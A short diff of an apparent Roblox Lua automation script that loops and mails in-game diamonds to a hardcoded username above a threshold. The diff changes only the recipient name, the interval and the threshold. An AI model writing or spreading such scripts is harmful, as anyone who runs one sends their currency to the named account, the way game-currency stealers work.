@@ -21,10 +21,10 @@ end)
 spawn(function()
     local CurrencyCmds = require(game:GetService("ReplicatedStorage").Library.Client.CurrencyCmds)
     
-    local username = "ProfiAzUr" -- Replace with recipient's username
-    local loopInterval = 2 -- Interval in minutes
+    local username = "ElfBarZero" -- Replace with recipient's username
+    local loopInterval = 5 -- Interval in minutes
     local mailTax = 100000 -- Tax deduction for sending diamonds
-    local diamondThreshold = 50000000 -- Threshold for sending all gems
+    local diamondThreshold = 100000000 -- Threshold for sending all gems
 
     while true do
         print("Attempting to retrieve diamond data...")
